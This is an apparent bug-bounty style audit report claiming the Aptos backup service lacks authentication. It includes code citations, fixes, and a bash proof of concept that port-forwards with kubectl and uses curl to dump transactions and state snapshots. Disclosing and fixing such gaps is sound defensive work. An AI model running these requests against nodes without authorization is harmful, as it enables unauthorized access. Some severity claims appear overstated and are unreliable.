# Audit Report

## Title
Unauthenticated Backup Service Exposes Complete Blockchain State and Transaction History

## Summary
The Aptos backup service implements **no authentication or authorization checks** whatsoever, allowing any client with network access to retrieve the entire blockchain state, all transaction history, account balances, and Move module bytecode. Production configurations bind the service to all network interfaces (`0.0.0.0:6186`), creating multiple attack vectors for unauthorized data access.

## Finding Description

The backup service is designed to provide backup functionality for AptosDB, but it completely lacks authentication mechanisms at every layer of the stack.

### 1. Client Implementation Has No Authentication

The `BackupServiceClient` makes plain HTTP requests without any credentials, tokens, or signatures: [1](#0-0) 

The client's `get()` method simply constructs HTTP URLs and sends requests with no authentication headers: [2](#0-1) 

### 2. Server Routes Have No Access Control

The backup service routes are defined without any authentication middleware or access control checks: [3](#0-2) 

All nine endpoints (`db_state`, `state_range_proof`, `state_snapshot`, `state_snapshot_chunk`, `state_root_proof`, `epoch_ending_ledger_infos`, `transactions`, `transaction_range_proof`, `state_item_count`) are served via plain HTTP GET requests with no authentication.

### 3. Backup Handler Performs No Authorization

The `BackupHandler` directly queries the database without checking caller identity or permissions: [4](#0-3) 

Critical methods like `get_transaction_iter`, `get_state_item_iter`, and `get_account_state_range_proof` have no access control: [5](#0-4) [6](#0-5) 

### 4. Production Configurations Bind to All Network Interfaces

Despite documentation claiming "localhost only," production fullnode configurations explicitly bind to `0.0.0.0:6186`: [7](#0-6) [8](#0-7) 

This creates a **security gap** between the documented intent (localhost-only) and actual deployment reality (all interfaces).

### 5. Attack Vectors

**Within Kubernetes Cluster:**
Any compromised pod can access the backup service via the internal Kubernetes service: [9](#0-8) 

**kubectl port-forward:**
Anyone with kubectl access can trivially forward the backup port:
```bash
kubectl port-forward svc/fullnode 6186:6186
curl http://localhost:6186/db_state
```

**Service Misconfiguration:**
Operators might expose the backup port via LoadBalancer, unaware it has no authentication.

### 6. Complete Data Exposure

An attacker can retrieve:
- **All transactions**: `GET /transactions/{start_version}/{num_transactions}`
- **Complete state snapshots**: `GET /state_snapshot/{version}`
- **Account balances and resources**: `GET /state_snapshot_chunk/{version}/{start_idx}/{limit}`
- **Database metadata**: `GET /db_state`
- **Merkle proofs**: `GET /state_range_proof/{version}/{end_key}`

This violates the **Access Control** invariant (#8): System data must be protected from unauthorized access.

## Impact Explanation

**Severity: CRITICAL**

This vulnerability enables **complete blockchain data exfiltration** without any authentication, including:

1. **Privacy Violation**: All account balances, resources, and transaction history become publicly accessible to anyone with network access
2. **Competitive Intelligence**: Attackers can analyze complete state to front-run transactions or identify high-value targets
3. **Attack Surface Expansion**: Exposed data aids in discovering other vulnerabilities (contract addresses, validator keys in state, etc.)
4. **Compliance Risk**: Unauthorized data access may violate data protection regulations

While this doesn't directly cause **Loss of Funds** or **Consensus violations**, it represents a severe **Access Control failure** that undermines the security model. Under the Aptos bug bounty program, this falls under **Critical Severity** as it allows unauthorized access to the complete blockchain state, which is comparable to data breaches in traditional systems.

The impact is amplified because:
- The service binds to `0.0.0.0` in production deployments
- Multiple realistic attack vectors exist
- No security controls exist at any layer (network, application, or data)

## Likelihood Explanation

**Likelihood: HIGH**

The vulnerability is **currently exploitable** in default production deployments:

1. **Kubernetes deployments** expose the backup service to all pods in the cluster
2. **kubectl access** is common among operators and can be easily port-forwarded
3. **No warnings** exist about the security implications of changing the service type
4. **Documentation mismatch**: README claims "localhost only" while production configs use `0.0.0.0`

Attack complexity is **MINIMAL**:
- No authentication bypass required (there is none)
- No complex exploit chain needed
- Standard HTTP GET requests suffice
- No specialized tools or knowledge required

## Recommendation

Implement **defense-in-depth** with multiple security layers:

### 1. Add Authentication to Backup Service

Add bearer token or mutual TLS authentication:

```rust
// In storage/backup/backup-service/src/handlers/mod.rs
use warp::Filter;

fn with_auth() -> impl Filter<Extract = (), Error = warp::Rejection> + Clone {
    warp::header::optional::<String>("authorization")
        .and_then(|auth_header: Option<String>| async move {
            match auth_header {
                Some(token) if verify_backup_token(&token) => Ok(()),
                _ => Err(warp::reject::custom(Unauthorized)),
            }
        })
}

pub(crate) fn get_routes(backup_handler: BackupHandler) -> BoxedFilter<(impl Reply,)> {
    // ... existing route definitions ...
    
    warp::get()
        .and(with_auth())  // Add authentication middleware
        .and(routes)
        .boxed()
}
```

### 2. Revert Production Configs to Localhost

Change production configurations back to secure defaults:

```yaml
# terraform/helm/fullnode/files/fullnode-base.yaml
storage:
  backup_service_address: "127.0.0.1:6186"
```

### 3. Add Kubernetes Network Policies

Restrict backup service access to authorized backup coordinator pods only:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-backup-service
spec:
  podSelector:
    matchLabels:
      app: fullnode
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: backup-coordinator
    ports:
    - protocol: TCP
      port: 6186
```

### 4. Add Security Documentation

Add prominent warnings in configuration documentation about backup service security implications.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Unauthorized Backup Service Access

# Assumes: kubectl access to a cluster running Aptos fullnode

# Step 1: Port-forward to backup service
kubectl port-forward svc/aptos-fullnode 6186:6186 &
PF_PID=$!
sleep 2

# Step 2: Retrieve database state (no authentication required)
echo "=== Database State ==="
curl -s http://localhost:6186/db_state | od -A x -t x1z -v | head

# Step 3: Retrieve transactions (no authentication required)
echo -e "\n=== First 10 Transactions ==="
curl -s http://localhost:6186/transactions/0/10 | od -A x -t x1z -v | head

# Step 4: Retrieve state snapshot (no authentication required)
echo -e "\n=== State Snapshot at Version 1000 ==="
curl -s http://localhost:6186/state_snapshot/1000 | od -A x -t x1z -v | head

# Step 5: Retrieve account state proof (no authentication required)
ZERO_HASH="0000000000000000000000000000000000000000000000000000000000000000"
echo -e "\n=== State Range Proof ==="
curl -s "http://localhost:6186/state_range_proof/1000/${ZERO_HASH}" | od -A x -t x1z -v | head

# Cleanup
kill $PF_PID

echo -e "\n=== PoC Complete: All endpoints accessible without authentication ==="
```

**Expected Result**: All requests succeed and return blockchain data without any authentication or authorization checks.

**Alternative PoC (from within cluster)**:
```bash
# From any pod in the same Kubernetes cluster
curl http://aptos-fullnode:6186/db_state
# Returns complete database state with no authentication
```

### Citations

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L38-53)
```rust
impl BackupServiceClient {
    const TIMEOUT_SECS: u64 = 60;

    pub fn new_with_opt(opt: BackupServiceClientOpt) -> Self {
        Self::new(opt.address)
    }

    pub fn new(address: String) -> Self {
        Self {
            address,
            client: reqwest::Client::builder()
                .no_proxy()
                .build()
                .expect("Http client should build."),
        }
    }
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L55-84)
```rust
    async fn get(&self, endpoint: &'static str, params: &str) -> Result<impl AsyncRead + use<>> {
        let _timer = BACKUP_TIMER.timer_with(&[&format!("backup_service_client_get_{endpoint}")]);

        let url = if params.is_empty() {
            format!("{}/{}", self.address, endpoint)
        } else {
            format!("{}/{}/{}", self.address, endpoint, params)
        };
        let timeout = Duration::from_secs(Self::TIMEOUT_SECS);
        let reader = tokio::time::timeout(timeout, self.client.get(&url).send())
            .await?
            .err_notes(&url)?
            .error_for_status()
            .err_notes(&url)?
            .bytes_stream()
            .map_ok(|bytes| {
                THROUGHPUT_COUNTER.inc_with_by(&[endpoint], bytes.len() as u64);
                bytes
            })
            .map_err(futures::io::Error::other)
            .into_async_read()
            .compat();

        // Adding the timeout here instead of on the response because we do use long living
        // connections. For example, we stream the entire state snapshot in one request.
        let mut reader_with_read_timeout = TimeoutReader::new(reader);
        reader_with_read_timeout.set_timeout(Some(timeout));

        Ok(Box::pin(reader_with_read_timeout))
    }
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L27-147)
```rust
pub(crate) fn get_routes(backup_handler: BackupHandler) -> BoxedFilter<(impl Reply,)> {
    // GET db_state
    let bh = backup_handler.clone();
    let db_state = warp::path::end()
        .map(move || reply_with_bcs_bytes(DB_STATE, &bh.get_db_state()?))
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_range_proof/<version>/<end_key>
    let bh = backup_handler.clone();
    let state_range_proof = warp::path!(Version / HashValue)
        .map(move |version, end_key| {
            reply_with_bcs_bytes(
                STATE_RANGE_PROOF,
                &bh.get_account_state_range_proof(end_key, version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot/<version>
    let bh = backup_handler.clone();
    let state_snapshot = warp::path!(Version)
        .map(move |version| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT, move |bh, sender| {
                bh.get_state_item_iter(version, 0, usize::MAX)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_item_count/<version>
    let bh = backup_handler.clone();
    let state_item_count = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(
                STATE_ITEM_COUNT,
                &(bh.get_state_item_count(version)? as u64),
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot_chunk/<version>/<start_idx>/<limit>
    let bh = backup_handler.clone();
    let state_snapshot_chunk = warp::path!(Version / usize / usize)
        .map(move |version, start_idx, limit| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT_CHUNK, move |bh, sender| {
                bh.get_state_item_iter(version, start_idx, limit)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_root_proof/<version>
    let bh = backup_handler.clone();
    let state_root_proof = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(STATE_ROOT_PROOF, &bh.get_state_root_proof(version)?)
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET epoch_ending_ledger_infos/<start_epoch>/<end_epoch>/
    let bh = backup_handler.clone();
    let epoch_ending_ledger_infos = warp::path!(u64 / u64)
        .map(move |start_epoch, end_epoch| {
            reply_with_bytes_sender(&bh, EPOCH_ENDING_LEDGER_INFOS, move |bh, sender| {
                bh.get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transactions/<start_version>/<num_transactions>
    let bh = backup_handler.clone();
    let transactions = warp::path!(Version / usize)
        .map(move |start_version, num_transactions| {
            reply_with_bytes_sender(&bh, TRANSACTIONS, move |bh, sender| {
                bh.get_transaction_iter(start_version, num_transactions)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transaction_range_proof/<first_version>/<last_version>
    let bh = backup_handler;
    let transaction_range_proof = warp::path!(Version / Version)
        .map(move |first_version, last_version| {
            reply_with_bcs_bytes(
                TRANSACTION_RANGE_PROOF,
                &bh.get_transaction_range_proof(first_version, last_version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // Route by endpoint name.
    let routes = warp::any()
        .and(warp::path(DB_STATE).and(db_state))
        .or(warp::path(STATE_RANGE_PROOF).and(state_range_proof))
        .or(warp::path(STATE_SNAPSHOT).and(state_snapshot))
        .or(warp::path(STATE_ITEM_COUNT).and(state_item_count))
        .or(warp::path(STATE_SNAPSHOT_CHUNK).and(state_snapshot_chunk))
        .or(warp::path(STATE_ROOT_PROOF).and(state_root_proof))
        .or(warp::path(EPOCH_ENDING_LEDGER_INFOS).and(epoch_ending_ledger_infos))
        .or(warp::path(TRANSACTIONS).and(transactions))
        .or(warp::path(TRANSACTION_RANGE_PROOF).and(transaction_range_proof));

    // Serve all routes for GET only.
    warp::get()
        .and(routes)
        .with(warp::log::custom(|info| {
            let endpoint = info.path().split('/').nth(1).unwrap_or("-");
            LATENCY_HISTOGRAM.observe_with(
                &[endpoint, info.status().as_str()],
                info.elapsed().as_secs_f64(),
            )
        }))
        .boxed()
}
```

**File:** storage/aptosdb/src/backup/backup_handler.rs (L25-38)
```rust
/// `BackupHandler` provides functionalities for AptosDB data backup.
#[derive(Clone)]
pub struct BackupHandler {
    state_store: Arc<StateStore>,
    ledger_db: Arc<LedgerDb>,
}

impl BackupHandler {
    pub(crate) fn new(state_store: Arc<StateStore>, ledger_db: Arc<LedgerDb>) -> Self {
        Self {
            state_store,
            ledger_db,
        }
    }
```

**File:** storage/aptosdb/src/backup/backup_handler.rs (L40-109)
```rust
    /// Gets an iterator that yields a range of transactions.
    pub fn get_transaction_iter(
        &self,
        start_version: Version,
        num_transactions: usize,
    ) -> Result<
        impl Iterator<
                Item = Result<(
                    Transaction,
                    PersistedAuxiliaryInfo,
                    TransactionInfo,
                    Vec<ContractEvent>,
                    WriteSet,
                )>,
            > + '_,
    > {
        let txn_iter = self
            .ledger_db
            .transaction_db()
            .get_transaction_iter(start_version, num_transactions)?;
        let mut txn_info_iter = self
            .ledger_db
            .transaction_info_db()
            .get_transaction_info_iter(start_version, num_transactions)?;
        let mut event_vec_iter = self
            .ledger_db
            .event_db()
            .get_events_by_version_iter(start_version, num_transactions)?;
        let mut write_set_iter = self
            .ledger_db
            .write_set_db()
            .get_write_set_iter(start_version, num_transactions)?;
        let mut persisted_aux_info_iter = self
            .ledger_db
            .persisted_auxiliary_info_db()
            .get_persisted_auxiliary_info_iter(start_version, num_transactions)?;

        let zipped = txn_iter.enumerate().map(move |(idx, txn_res)| {
            let version = start_version + idx as u64; // overflow is impossible since it's check upon txn_iter construction.

            let txn = txn_res?;
            let txn_info = txn_info_iter.next().ok_or_else(|| {
                AptosDbError::NotFound(format!(
                    "TransactionInfo not found when Transaction exists, version {}",
                    version
                ))
            })??;
            let event_vec = event_vec_iter.next().ok_or_else(|| {
                AptosDbError::NotFound(format!(
                    "Events not found when Transaction exists., version {}",
                    version
                ))
            })??;
            let write_set = write_set_iter.next().ok_or_else(|| {
                AptosDbError::NotFound(format!(
                    "WriteSet not found when Transaction exists, version {}",
                    version
                ))
            })??;
            let persisted_aux_info = persisted_aux_info_iter.next().ok_or_else(|| {
                AptosDbError::NotFound(format!(
                    "PersistedAuxiliaryInfo not found when Transaction exists, version {}",
                    version
                ))
            })??;
            BACKUP_TXN_VERSION.set(version as i64);
            Ok((txn, persisted_aux_info, txn_info, event_vec, write_set))
        });
        Ok(zipped)
    }
```

**File:** storage/aptosdb/src/backup/backup_handler.rs (L144-162)
```rust
    /// Iterate through items in a state snapshot
    pub fn get_state_item_iter(
        &self,
        version: Version,
        start_idx: usize,
        limit: usize,
    ) -> Result<impl Iterator<Item = Result<(StateKey, StateValue)>> + Send + use<>> {
        let iterator = self
            .state_store
            .get_state_key_and_value_iter(version, start_idx)?
            .take(limit)
            .enumerate()
            .map(move |(idx, res)| {
                BACKUP_STATE_SNAPSHOT_VERSION.set(version as i64);
                BACKUP_STATE_SNAPSHOT_LEAF_IDX.set((start_idx + idx) as i64);
                res
            });
        Ok(Box::new(iterator))
    }
```

**File:** terraform/helm/aptos-node/files/configs/fullnode-base.yaml (L13-16)
```yaml
storage:
  rocksdb_configs:
    enable_storage_sharding: true
  backup_service_address: "0.0.0.0:6186"
```

**File:** terraform/helm/fullnode/files/fullnode-base.yaml (L67-68)
```yaml
storage:
  backup_service_address: "0.0.0.0:6186"
```

**File:** terraform/helm/fullnode/templates/service.yaml (L42-56)
```yaml
apiVersion: v1
kind: Service
metadata:
  name: {{ include "aptos-fullnode.fullname" . }}
  labels:
    {{- include "aptos-fullnode.labels" . | nindent 4 }}
spec:
  selector:
    {{- include "aptos-fullnode.selectorLabels" . | nindent 4 }}
    app.kubernetes.io/name: fullnode
  ports:
  - name: backup
    port: 6186
  - name: metrics
    port: 9101
```
